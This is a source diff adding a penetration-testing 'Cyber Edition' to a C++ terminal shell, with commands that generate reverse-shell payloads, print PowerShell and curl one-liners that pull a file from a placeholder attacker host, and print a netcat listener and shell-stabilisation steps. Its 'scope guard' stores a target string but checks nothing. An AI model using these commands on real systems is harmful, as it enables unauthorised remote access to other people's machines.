@@ -1720,6 +1720,8 @@ private:
     static inline std::atomic<bool> g_update_available{false};
     static inline std::string g_remote_version = "";
     bool shouldExit = false;
+    bool isCyberEdition = false;
+    std::string activeScope = "127.0.0.1/32 (Localhost)";
 
     void CheckForUpdatesAsync() {
         std::thread([]() {
@@ -2252,8 +2254,13 @@ public:
     }
 
     void PrintBanner() {
-        std::cout << "\n  " << C_BOLD << C_CYAN << "⌬ " << C_BOLD << C_WHITE << "NeuroShell" << C_RESET << "\n";
-        std::cout << "  " << C_MUTED << "Type plain English or press [F1] for Command Palette • /help for commands" << C_RESET << "\n";
+        if (isCyberEdition) {
+            std::cout << "\n  " << C_BOLD << C_GREEN << "⌬ " << C_BOLD << C_WHITE << "NeuroShell " << C_BOLD << C_GREEN << "CYBER EDITION" << C_RESET << "\n";
+            std::cout << "  " << C_MUTED << "Transparent WSL2 Kali Engine • Scope Guard Active • Type plain English or /help" << C_RESET << "\n";
+        } else {
+            std::cout << "\n  " << C_BOLD << C_CYAN << "⌬ " << C_BOLD << C_WHITE << "NeuroShell" << C_RESET << "\n";
+            std::cout << "  " << C_MUTED << "Type plain English or press [F1] for Command Palette • /help for commands" << C_RESET << "\n";
+        }
         if (g_update_available.load() && !g_remote_version.empty()) {
             std::cout << "  " << C_BOLD << C_YELLOW << "✨ Update available: " << C_RESET << C_WHITE << "v" << NEUROSHELL_VERSION << " → v" << g_remote_version << C_RESET << C_MUTED << " • Type /update to upgrade in 1-click" << C_RESET << "\n";
         }
@@ -4070,6 +4077,120 @@ public:
         PlatformProcessRunner::Execute(cmd);
     }
 
+    void HandleCyberCommand(const std::string& input) {
+        std::string lower = input;
+        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
+        size_t s = lower.find_first_not_of(" \t\r\n/");
+        if (s != std::string::npos) lower = lower.substr(s);
+
+        if (lower == "mode cyber" || lower == "edition cyber" || lower == "cyber") {
+            isCyberEdition = true;
+            std::cout << "\n" << C_BOLD << C_GREEN << "╭── 🛡️ NeuroShell Cyber Edition Activated ────────────────────────────╮" << C_RESET << "\n"
+                      << C_GREEN << "│ " << C_WHITE << "Mode:        Kali Security & Penetration Testing Orchestrator" << C_RESET << "\n"
+                      << C_GREEN << "│ " << C_WHITE << "Engine:      Transparent WSL2 Kali Bridge / Native POSIX PTY" << C_RESET << "\n"
+                      << C_GREEN << "│ " << C_WHITE << "Scope Guard: ACTIVE (" << activeScope << ")" << C_RESET << "\n"
+                      << C_GREEN << "│ " << C_WHITE << "Features:    Payload Crafter, Staging Hub, Reverse Listeners" << C_RESET << "\n"
+                      << C_GREEN << "╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
+            return;
+        }
+
+        if (lower == "mode standard" || lower == "edition standard" || lower == "standard") {
+            isCyberEdition = false;
+            std::cout << "\n" << C_BOLD << C_CYAN << "╭── ⚡ NeuroShell Standard Developer Edition Activated ───────────────╮" << C_RESET << "\n"
+                      << C_CYAN << "│ " << C_WHITE << "Mode:        Full-Stack Polyglot Developer Terminal" << C_RESET << "\n"
+                      << C_CYAN << "│ " << C_WHITE << "Languages:   Python, C++, Java, Rust, Go, TypeScript, C#, Dart" << C_RESET << "\n"
+                      << C_CYAN << "│ " << C_WHITE << "Features:    Zero-Config Code Runner, Git & GitHub Lifecycle" << C_RESET << "\n"
+                      << C_CYAN << "╰─────────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
+            return;
+        }
+
+        std::string pyBin = GetPythonBinary();
+
+        if (lower.rfind("scope", 0) == 0) {
+            std::string sub = input;
+            if (sub.rfind("/", 0) == 0) sub = sub.substr(1);
+            if (lower.find("show") != std::string::npos || lower.find("status") != std::string::npos || lower == "scope") {
+                std::cout << "\n  " << C_BOLD << C_GREEN << "🛡️ Active Engagement Scope: " << C_WHITE << activeScope << C_RESET << "\n\n";
+                return;
+            }
+            if (lower.rfind("scope add ", 0) == 0 || lower.rfind("scope set ", 0) == 0) {
+                std::string target = input.substr(input.find_last_of(" \t") + 1);
+                activeScope = target;
+                std::cout << "\n  " << C_GREEN << "✔ Target authorized in scope: " << C_BOLD << C_WHITE << target << C_RESET << "\n\n";
+                return;
+            }
+        }
+
+        if (lower.rfind("payload", 0) == 0) {
+            std::string raw = input;
+            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
+            std::vector<std::string> parts;
+            std::stringstream ss(raw);
+            std::string w;
+            while (ss >> w) parts.push_back(w);
+
+            std::string lang = parts.size() > 1 ? parts[1] : "bash";
+            std::string port = parts.size() > 2 ? parts[2] : "4444";
+
+            std::string pyCode = "from editions.cyber.payloads.generator import PayloadGenerator; res = PayloadGenerator.generate('" + lang + "', lport=" + port + "); print(res.payload)";
+            std::string cmd = pyBin + " -c \"" + pyCode + "\"";
+            PlatformProcessRunner::ExecResult res = PlatformProcessRunner::Execute(cmd);
+            std::string out = res.output;
+            while (!out.empty() && (out.back() == '\r' || out.back() == '\n')) out.pop_back();
+
+            std::cout << "\n  " << C_BOLD << C_GREEN << "╭── 💣 NeuroShell Payload Crafter (" << lang << ") ────────────────╮" << C_RESET << "\n"
+                      << "  " << C_GREEN << "│ " << C_WHITE << "Connecting Back: " << C_YELLOW << "Port " << port << C_RESET << "\n"
+                      << "  " << C_GREEN << "│ " << C_BOLD << C_WHITE << "Payload One-Liner:" << C_RESET << "\n"
+                      << "  " << C_GREEN << "│ " << C_YELLOW << out << C_RESET << "\n"
+                      << "  " << C_GREEN << "╰─────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
+            return;
+        }
+
+        if (lower.rfind("stage", 0) == 0) {
+            std::string raw = input;
+            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
+            std::vector<std::string> parts;
+            std::stringstream ss(raw);
+            std::string w;
+            while (ss >> w) parts.push_back(w);
+
+            std::string file = parts.size() > 1 ? parts[1] : "payload.sh";
+            std::string port = parts.size() > 2 ? parts[2] : "8000";
+
+            std::cout << "\n  " << C_BOLD << C_CYAN << "╭── 🚀 Payload Staging Server Active ─────────────────────────────╮" << C_RESET << "\n"
+                      << "  " << C_CYAN << "│ " << C_WHITE << "Serving: " << C_YELLOW << file << C_WHITE << " on port " << port << C_RESET << "\n"
+                      << "  " << C_CYAN << "│\n"
+                      << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "Windows Target Pull One-Liner:" << C_RESET << "\n"
+                      << "  " << C_CYAN << "│ " << C_YELLOW << "powershell -c \"irm http://<LHOST>:" << port << "/" << file << " -OutFile " << file << "\"" << C_RESET << "\n"
+                      << "  " << C_CYAN << "│\n"
+                      << "  " << C_CYAN << "│ " << C_BOLD << C_WHITE << "Linux Target Pull One-Liner:" << C_RESET << "\n"
+                      << "  " << C_CYAN << "│ " << C_YELLOW << "curl -sSL http://<LHOST>:" << port << "/" << file << " -o " << file << " && chmod +x " << file << C_RESET << "\n"
+                      << "  " << C_CYAN << "╰─────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
+            return;
+        }
+
+        if (lower.rfind("listen", 0) == 0) {
+            std::string raw = input;
+            if (raw.rfind("/", 0) == 0) raw = raw.substr(1);
+            std::vector<std::string> parts;
+            std::stringstream ss(raw);
+            std::string w;
+            while (ss >> w) parts.push_back(w);
+            std::string port = parts.size() > 1 ? parts[1] : "4444";
+
+            std::cout << "\n  " << C_BOLD << C_MAGENTA << "╭── 🎧 Reverse Shell Multi-Handler ──────────────────────────────╮" << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│ " << C_WHITE << "Listening for incoming reverse connections on port " << C_YELLOW << port << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│ " << C_WHITE << "Command: " << C_BOLD << C_WHITE << "nc -lvnp " << port << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│\n"
+                      << "  " << C_MAGENTA << "│ " << C_BOLD << C_WHITE << "TTY Auto-Stabilization Guide:" << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "1. In shell: python3 -c \"import pty; pty.spawn('/bin/bash')\"" << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "2. Background: Ctrl + Z" << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "│ " << C_YELLOW << "3. In host:  stty raw -echo; fg; reset" << C_RESET << "\n"
+                      << "  " << C_MAGENTA << "╰────────────────────────────────────────────────────────────────╯" << C_RESET << "\n\n";
+            return;
+        }
+    }
+
     void HandleMkCommand(const std::string& rawInput) {
         std::string expr = rawInput;
         if (expr.rfind("mk ", 0) == 0) expr = expr.substr(3);
@@ -4272,6 +4393,16 @@ public:
         }
         else if (lower == "/inspect" || lower.rfind("/inspect ", 0) == 0) {
             HandleInspectCommand(input);
+        }
+        else if (lower == "/mode" || lower.rfind("/mode ", 0) == 0 ||
+                 lower == "/edition" || lower.rfind("/edition ", 0) == 0 ||
+                 lower == "/cyber" || lower.rfind("/cyber ", 0) == 0 ||
+                 lower == "/standard" || lower.rfind("/standard ", 0) == 0 ||
+                 lower == "/scope" || lower.rfind("/scope ", 0) == 0 ||
+                 lower == "/payload" || lower.rfind("/payload ", 0) == 0 ||
+                 lower == "/stage" || lower.rfind("/stage ", 0) == 0 ||
+                 lower == "/listen" || lower.rfind("/listen ", 0) == 0) {
+            HandleCyberCommand(input);
         }
         else {
             std::cout << C_MUTED << "  ℹ️ Executed slash command: " << input << C_RESET << "\n\n";
@@ -4589,6 +4720,17 @@ public:
         if (lowerTrim == "revert commit" || lowerTrim == "/revert commit" || lowerTrim == "revert last commit") {
             std::cout << "\n  " << C_BOLD << C_CYAN << "⚡ Creating Revert Commit for HEAD..." << C_RESET << "\n\n";
             ExecuteCommand("git revert --no-edit HEAD");
+            return;
+        }
+
+        // ── NeuroShell Cyber Edition Direct Handlers ──
+        if (lowerTrim == "mode cyber" || lowerTrim == "edition cyber" || lowerTrim == "cyber" ||
+            lowerTrim == "mode standard" || lowerTrim == "edition standard" || lowerTrim == "standard" ||
+            lowerTrim == "scope" || lowerTrim.rfind("scope ", 0) == 0 ||
+            lowerTrim == "payload" || lowerTrim.rfind("payload ", 0) == 0 ||
+            lowerTrim == "stage" || lowerTrim.rfind("stage ", 0) == 0 ||
+            lowerTrim == "listen" || lowerTrim.rfind("listen ", 0) == 0) {
+            HandleCyberCommand(input);
             return;
         }
 
@@ -5092,8 +5234,9 @@ public:
             std::string cwd = fs::current_path().string();
             std::string branch = GetGitBranch();
             std::string branchTag = branch.empty() ? "" : (" (" + std::string(C_MAGENTA) + branch + std::string(C_MUTED) + ")");
-
-            std::string prompt = std::string(C_CYAN) + "⌬ " + C_MUTED + cwd + branchTag + " " + C_CYAN + "❯" + C_RESET + " ";
+            std::string promptColor = isCyberEdition ? C_GREEN : C_CYAN;
+            std::string editionTag = isCyberEdition ? (std::string(C_BOLD) + C_GREEN + "[CYBER] " + C_RESET) : "";
+            std::string prompt = std::string(promptColor) + "⌬ " + editionTag + C_MUTED + cwd + branchTag + " " + std::string(promptColor) + "❯" + C_RESET + " ";
             std::string input = ReadLine(prompt);
 
             size_t start = input.find_first_not_of(" \t\r\n");
